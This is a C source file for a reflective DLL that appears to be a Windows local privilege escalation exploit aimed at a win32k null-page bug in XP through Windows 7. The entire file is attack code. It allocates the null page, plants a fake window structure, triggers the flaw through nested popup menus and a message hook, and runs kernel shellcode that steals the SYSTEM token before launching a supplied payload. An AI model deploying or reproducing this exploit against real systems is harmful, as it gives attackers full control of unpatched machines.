#define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
#include "../../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

// Uncomment this line to enable to debug output
#define DEBUGGING

// Purloined from ntstatus.h
#define STATUS_SUCCESS                          ((NTSTATUS)0x00000000L) // ntsubauth

#define WIN32_NO_STATUS
#include <windows.h>
#undef WIN32_NO_STATUS

#ifdef DEBUGGING
// only needed because of the output printf stuff when debugging
#include <stdio.h>
#endif

#ifndef _NTDEF_
typedef __success(return >= 0) LONG NTSTATUS;
typedef NTSTATUS *PNTSTATUS;
#endif

#define PTR_SIZE sizeof(UINT_PTR)

typedef NTSTATUS(NTAPI *lNtAllocateVirtualMemory)(
	IN  HANDLE  ProcessHandle,
	IN  PVOID   *BaseAddress,
	IN  PULONG  ZeroBits,
	IN  PSIZE_T RegionSize,
	IN  ULONG   AllocationType,
	IN  ULONG   Protect
);

typedef NTSTATUS(NTAPI *lPsLookupProcessByProcessId)(
	IN   HANDLE ProcessId,
	OUT  PVOID Process
);

typedef NTSTATUS(NTAPI *lZwQuerySystemInformation)(
	_In_       DWORD SystemInformationClass,
	_Inout_    PVOID SystemInformation,
	_In_       ULONG SystemInformationLength,
	_Out_opt_  PULONG ReturnLength
);

typedef struct _SYSTEM_MODULE
{
	HANDLE               Reserved1;
	PVOID                Reserved2;
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	USHORT               Id;
	USHORT               Rank;
	USHORT               w018;
	USHORT               NameOffset;
	BYTE                 Name[256];
} SYSTEM_MODULE, *PSYSTEM_MODULE;

typedef struct _SYSTEM_MODULE_INFORMATION
{
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[0];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

BOOL bWndProcFlag = FALSE;
BOOL bHookCallbackFlag = FALSE;

WNDPROC lpPrevWndFunc;
DWORD dwMyProcessId = 0;
DWORD dwOffsetWindows = 0;

lPsLookupProcessByProcessId pPsLookupProcessByProcessId = NULL;
lNtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;

#ifdef DEBUGGING
void LogMessage(char* pszFormat, ...)
{
	char s_acBuf[2048];
	va_list args;
	va_start(args, pszFormat);
	vsprintf_s(s_acBuf, sizeof(s_acBuf) - 1, pszFormat, args);
	printf("%s\n", s_acBuf);
	OutputDebugString(s_acBuf);
	va_end(args);
}
#else
#define LogMessage(...)
#endif

long CALLBACK HookCallbackTwo(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	EndMenu();
	return -5;
}

LRESULT CALLBACK HookCallback(int code, WPARAM wParam, LPARAM lParam)
{
	if (*(DWORD *)(lParam + PTR_SIZE * 2) == 0x1EB && !bHookCallbackFlag)
	{
		bHookCallbackFlag = TRUE;
		if (UnhookWindowsHook(WH_CALLWNDPROC, HookCallback))
		{
			lpPrevWndFunc = (WNDPROC)SetWindowLongPtrA(*(HWND *)(lParam + PTR_SIZE * 3), GWLP_WNDPROC, (ULONG_PTR)HookCallbackTwo);
		}
	}
	return CallNextHookEx(0, code, wParam, lParam);
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	if (msg == 289 && !bWndProcFlag)
	{
		bWndProcFlag = TRUE;
		PostMessageA(hwnd, 256, 40, 0);
		PostMessageA(hwnd, 256, 39, 0);
		PostMessageA(hwnd, 513, 0, 0);
	}
	return DefWindowProc(hwnd, msg, wParam, lParam);
}

DWORD_PTR __stdcall get_threadinfo_ptr(void)
{
#ifdef _M_X64
	void *teb = (void *)__readgsqword(0x30);
	DWORD_PTR Win32ThreadInfo = (DWORD_PTR)*((PDWORD_PTR)((PBYTE)teb + 0x78));

	return Win32ThreadInfo;
#else
	__asm {
		mov eax, fs : 18h
		mov eax, [eax + 40h]
	}
#endif
}

int _stdcall shellcode_ring0(int one, int two, int three, int four)
{
	void *my_process_info = NULL;
	void *system_info = NULL;

	pPsLookupProcessByProcessId((HANDLE)dwMyProcessId, &my_process_info);
	pPsLookupProcessByProcessId((HANDLE)4, &system_info);

	*(PDWORD)((PBYTE)my_process_info + dwOffsetWindows) = *(PDWORD)((PBYTE)system_info + dwOffsetWindows);

	return 0;
}

DWORD WINAPI execute_payload(LPVOID lpPayload)
{
	VOID(*lpCode)() = (VOID(*)())lpPayload;
	lpCode();
	return ERROR_SUCCESS;
}

void Win32kNullPage(LPVOID lpPayload)
{
	HWND hWnd;
	WNDCLASSA WndClass;
	LPBYTE lpPromisedLand = NULL;
	HMODULE hNtdll = NULL;
	HMODULE ntkrnl = NULL;
	NTSTATUS status;
	PULONG pSystemInfoBuffer = NULL;
	lZwQuerySystemInformation pZwQuerySystemInformation = NULL;
	ULONG    SystemInfoBufferSize = 0;
	char nt_name[256];
	PVOID nt_base;
	OSVERSIONINFOA VersionInformation;

	// Getting Windows version
	LogMessage("[*] Getting Windows version...");
	memset(&VersionInformation, 0, sizeof(OSVERSIONINFOA));
	VersionInformation.dwOSVersionInfoSize = 148;

	if (!GetVersionExA(&VersionInformation))
	{
		LogMessage("[!] Failed to get windows version");
		return;
	}

#ifdef _M_X64
	if (VersionInformation.dwMajorVersion == 6 && VersionInformation.dwMinorVersion && VersionInformation.dwMinorVersion == 1)
	{
		// Ex: Windows 7 SP1
		LogMessage("[*] Windows 6.1 found...");
		dwOffsetWindows = 0x208;
	}
#else
	if (VersionInformation.dwMajorVersion == 6)
	{
		if (VersionInformation.dwMinorVersion && VersionInformation.dwMinorVersion == 1)
		{
			// Ex: Windows 7 SP1
			LogMessage("[*] Windows 6.1 found...");
			dwOffsetWindows = 0xf8;
		}
		else if (!VersionInformation.dwMinorVersion)
		{
			// Ex: Windows 2008 R2
			LogMessage("[*] Windows 6.0 found...");
			dwOffsetWindows = 0xe0;
		}
		else
		{
			LogMessage("[!] Unsupported Windows 6.%d found, only 6.0 and 6.1 supported atm", VersionInformation.dwMinorVersion);
			return;
		}
	}
	else if (VersionInformation.dwMajorVersion == 5)
	{
		if (VersionInformation.dwMinorVersion && VersionInformation.dwMinorVersion == 1) { // Ex: Windows XP SP3
			LogMessage("[*] Windows 5.1 found...");
			dwOffsetWindows = 0xc8;
		}
		else if (VersionInformation.dwMinorVersion && VersionInformation.dwMinorVersion == 2)
		{
			// Ex: Windows 2003 SP2
			LogMessage("[*] Windows 5.2 found...");
			dwOffsetWindows = 0xd8;
		}
		else
		{
			LogMessage("[!] Unsupported Windows 5  found, only 5.1 and 5.2 supported atm");
			return;
		}
	}
#endif
	else
	{
		LogMessage("[!] Major Version %d found, not supported", VersionInformation.dwMajorVersion);
		return;
	}

	// Solve symbols
	LogMessage("[*] Solving symbols...");

	hNtdll = LoadLibraryA("ntdll");
	if (hNtdll == NULL)
	{
		LogMessage("[!] Failed to Load ntdll...");
		return;
	}

	pZwQuerySystemInformation = (lZwQuerySystemInformation)GetProcAddress(hNtdll, "ZwQuerySystemInformation");
	if (pZwQuerySystemInformation == NULL)
	{
		LogMessage("[!] Failed to solve ZwQuerySystemInformation");
		return;
	}

	pNtAllocateVirtualMemory = (lNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	if (pNtAllocateVirtualMemory == NULL)
	{
		LogMessage("[!] Failed to solve NtAllocateVirtualMemory");
		return;
	}

	LogMessage("[*] Requesting Kernel loaded modules...");

	status = pZwQuerySystemInformation(11, &SystemInfoBufferSize, 0, &SystemInfoBufferSize);
	if (SystemInfoBufferSize == 0)
	{
		LogMessage("[!] Requesting pZwQuerySystemInformation required length failed");
		return;
	}

	LogMessage("[*] pZwQuerySystemInformation required length %d", SystemInfoBufferSize);

	pSystemInfoBuffer = (PULONG)LocalAlloc(LMEM_ZEROINIT, SystemInfoBufferSize);
	if (pSystemInfoBuffer == NULL)
	{
		LogMessage("[!] Allocation for SystemInfo failed");
		return;
	}

	status = pZwQuerySystemInformation(11, pSystemInfoBuffer, SystemInfoBufferSize, &SystemInfoBufferSize);

	if (status != STATUS_SUCCESS)
	{
		LogMessage("[!] Requesting kernel modules through ZwQuerySystemInformation failed");
		return;
	}

	LogMessage("[*] Parsing SYSTEM_INFO...");

	SYSTEM_MODULE_INFORMATION *smi = (SYSTEM_MODULE_INFORMATION *)pSystemInfoBuffer;

	LogMessage("[*] %d Kernel modules found\n", smi->ModulesCount);

	memset(nt_name, 0, 256);

	ULONG i = 0;
	while (i < smi->ModulesCount)
	{
		SYSTEM_MODULE *sm = (SYSTEM_MODULE *)(smi->Modules + i);
		LogMessage("[*] Checking module %s", sm->Name);
		if (strstr((char *)sm->Name, ".exe"))
		{
			char *start = strstr((char *)sm->Name, "nt");
			if (start != NULL)
			{
				nt_base = sm->ImageBaseAddress;
				strncpy_s(nt_name, 256, start, _TRUNCATE);
				break;
			}
		}
		i++;
	}

	if (nt_name == NULL)
	{
		LogMessage("[!] nt not found");
		return;
	}
	LogMessage("[*] Good! nt found as %s at 0x%08x", nt_name, nt_base);

	ntkrnl = LoadLibraryA(nt_name);

	LogMessage("[*] %s loaded in userspace at: %08x\n", nt_name, ntkrnl);

	pPsLookupProcessByProcessId = (lPsLookupProcessByProcessId)GetProcAddress(ntkrnl, "PsLookupProcessByProcessId");

	if (pPsLookupProcessByProcessId == NULL)
	{
		LogMessage("[!] Failed to solve PsLookupProcessByProcessId\n");
		return;
	}

	pPsLookupProcessByProcessId = (lPsLookupProcessByProcessId)((DWORD_PTR)nt_base + ((DWORD_PTR)pPsLookupProcessByProcessId - (DWORD_PTR)ntkrnl));
	LogMessage("[*] pPsLookupProcessByProcessId in kernel: 0x%p\n", pPsLookupProcessByProcessId);

	dwMyProcessId = GetCurrentProcessId();

	// Register Class
	LogMessage("[*] Registering class...");

	memset(&WndClass, 0, sizeof(WNDCLASSA));
	WndClass.lpfnWndProc = WndProc; // Called with CallWindowProc => http://msdn.microsoft.com/en-us/library/windows/desktop/ms633571(v=vs.85).aspx
	WndClass.lpszClassName = "woqunimalegebi";

	if (!RegisterClassA(&WndClass))
	{
		LogMessage("[!] RegisterClassA failed ");
		return;
	}

	// Create Window
	LogMessage("[*] Creating window...");
	hWnd = CreateWindowExA(0, "woqunimalegebi", NULL, 0, -1, -1, 0, 0, NULL, NULL, NULL, NULL);

	if (hWnd == NULL)
	{
		LogMessage("[!] CreateWindowExA failed");
		return;
	}

	// Making everything ready for exploitation...

	LogMessage("[*] Allocating null page...");
#ifdef _M_X64
	ULONGLONG dwBaseAddress = 0x00000000fffffffb;
#else
	DWORD dwBaseAddress = 1;
#endif

	SIZE_T sRegionSize = 0x1000;
	ULONG ulAllocationType = MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN;

	if (pNtAllocateVirtualMemory(GetCurrentProcess(), (LPVOID*)&dwBaseAddress, 0, &sRegionSize, ulAllocationType, PAGE_EXECUTE_READWRITE) != STATUS_SUCCESS)
	{
		LogMessage("[!] Failed to allocate null page");
		return;
	}

	LogMessage("[*] Getting PtiCurrent...");

	DWORD_PTR dwThreadInfoPtr = get_threadinfo_ptr();

	if (dwThreadInfoPtr == 0)
	{
		LoadLibrary("user32.dll");
		LoadLibrary("gdi32.dll");
		dwThreadInfoPtr = get_threadinfo_ptr();
	}

	if (dwThreadInfoPtr == 0)
	{
		LogMessage("[!] Filed to get current thread information");
		return;
	}

	LogMessage("[*] Good! dwThreadInfoPtr 0x%p", dwThreadInfoPtr);
	LogMessage("[*] Creating a fake structure at NULL...");

	LPVOID lpPtr = NULL;
#ifdef _M_X64
	(DWORD_PTR)lpPtr = 0x10000000B;
	*((PDWORD_PTR)lpPtr) = dwThreadInfoPtr;

	/* win32k!tagWND->bServerSideWindowProc = TRUE */
	(DWORD_PTR)lpPtr = 0x100000025;
	*((PBYTE)lpPtr) = 4;

	/* win32k!tagWND->lpfnWndProc = &shellcode_ring0 */
	(DWORD_PTR)lpPtr = 0x10000008B;
	*((PDWORD_PTR)lpPtr) = (DWORD_PTR)shellcode_ring0;
#else
	lpPtr = lpPromisedLand + 3;
	/* We need to save this check, otherwise unmapped memory will be dereferenced (blue screen)
	.text:BF8B93F4 02C mov     edi, _gptiCurrent
	.text:BF8B93FA 02C cmp     edi, [esi + 8];
	.text:BF8B93FD 02C jz      loc_BF8B
	*/
	*(LPDWORD)lpPtr = dwThreadInfoPtr;

	*((LPBYTE)(lpPromisedLand + 0x11)) = 0x4;

	lpPtr = lpPromisedLand + 0x5b;
	*(LPDWORD)lpPtr = (DWORD)shellcode_ring0;
#endif

	// Exploit!

	LogMessage("[*] Triggering vulnerability...");
	HMENU hMenuOne = CreatePopupMenu();
	if (hMenuOne == NULL)
	{
		LogMessage("[!] First CreatePopupMenu failed");
		return;
	}

	MENUITEMINFOA menuOneInfo;
	memset(&menuOneInfo, 0, sizeof(MENUITEMINFOA));
	menuOneInfo.cbSize = sizeof(MENUITEMINFOA);
	menuOneInfo.fMask = MIIM_STRING;

	if (InsertMenuItemA(hMenuOne, 0, TRUE, &menuOneInfo) != TRUE)
	{
		LogMessage("[!] First InsertMenuItemA failed");
		DestroyMenu(hMenuOne);
		return;
	}

	HMENU hMenuTwo = CreatePopupMenu();
	if (hMenuTwo == NULL)
	{
		LogMessage("[!] Second CreatePopupMenu failed");
		DestroyMenu(hMenuOne);
		return;
	}

	MENUITEMINFOA menuTwoInfo;
	memset(&menuTwoInfo, 0, sizeof(MENUITEMINFOA));
	menuTwoInfo.cbSize = sizeof(MENUITEMINFOA);
	menuTwoInfo.fMask = (MIIM_STRING | MIIM_SUBMENU);
	menuTwoInfo.dwTypeData = "";
	menuTwoInfo.cch = 1;
	menuTwoInfo.hSubMenu = hMenuOne;

	if (InsertMenuItemA(hMenuTwo, 0, TRUE, &menuTwoInfo) != TRUE)
	{
		LogMessage("[!] Second InsertMenuItemA failed");
		DestroyMenu(hMenuTwo);
		DestroyMenu(hMenuOne);
		return;
	}

	if (SetWindowsHookExA(WH_CALLWNDPROC, HookCallback, NULL, GetCurrentThreadId()) == NULL)
	{
		LogMessage("[!] SetWindowsHookExA failed :-(\n");
		DestroyMenu(hMenuTwo);
		DestroyMenu(hMenuOne);
		return;
	}

	// 'crash' it!
	TrackPopupMenu(hMenuTwo, 0, -10000, -10000, 0, hWnd, NULL);

	// If everything worked process should be privileges at this point
	LogMessage("[!] Executing payload...");
	CreateThread(0, 0, execute_payload, lpPayload, 0, NULL);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;
	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		hAppInstance = hinstDLL;
		if (lpReserved != NULL)
		{
			*(HMODULE *)lpReserved = hAppInstance;
		}
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;
		Win32kNullPage(lpReserved);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}
